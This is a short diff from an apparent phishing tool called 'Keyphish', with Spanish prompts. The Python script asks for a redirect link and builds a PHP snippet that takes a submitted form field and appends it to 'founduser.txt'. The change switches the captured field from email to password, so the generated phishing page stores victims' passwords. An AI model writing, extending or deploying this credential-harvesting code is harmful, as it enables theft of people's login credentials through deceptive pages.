@@ -65,7 +65,7 @@ def link():
 
     y=input('Inserte un link para redireccionar.\n     1- Atrás\nKeyphish:~$ ')
 
-    r=('''<?php\n$user = $_POST["email"];
+    r=('''<?php\n$user = $_POST["password"];
     $co = "===========================================\n"; 
     $cl = "===========================================\n";
     $fileuser = fopen("founduser.txt", "a") or die("Intentalo nuevamente");
